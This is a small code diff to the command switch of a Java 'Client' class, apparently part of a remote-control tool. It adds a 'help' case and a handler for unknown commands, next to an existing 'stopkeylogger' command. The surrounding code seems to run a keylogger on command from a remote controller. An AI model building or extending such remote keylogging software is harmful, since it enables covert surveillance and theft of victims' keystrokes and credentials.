@@ -97,9 +97,13 @@ public class Client {
                     case "stopkeylogger":
                         KeyLogger.stopKeylogger(from);
                         break;
+                    case "help":
+
+                        break;
                     default:
                         System.out.println("Something went wrong!");
-                        throw new AssertionError();
+                        HandleSubCase.handleWrongRequest(choice[1]);
+//                        throw new AssertionError();
                 }
             }
         }
